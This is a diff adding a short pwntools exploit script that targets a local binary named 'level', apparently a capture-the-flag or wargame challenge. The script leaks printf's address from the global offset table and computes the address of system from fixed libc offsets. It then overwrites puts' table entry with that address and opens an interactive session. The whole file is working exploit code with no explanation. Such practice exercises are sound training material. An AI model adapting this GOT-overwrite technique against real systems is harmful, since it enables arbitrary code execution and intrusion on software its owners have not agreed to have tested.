@@ -1,0 +1,19 @@
+#!/usr/bin/env python2
+
+from pwn import *
+
+target = process("./level")
+got_addr_printf = 0x0000000000601028
+got_addr_puts = 0x0000000000601018
+target.send(p64(got_addr_printf))
+target.readuntil("contains:")
+printf_addr = int(target.readline().strip())
+
+print "printf is located at: ", hex(printf_addr)
+
+offset_system = 0x00000000000410b0
+offset_printf = 0x00000000000514b0
+
+target.send(p64(got_addr_puts))
+target.send(p64(printf_addr-offset_printf+offset_system))
+target.interactive()
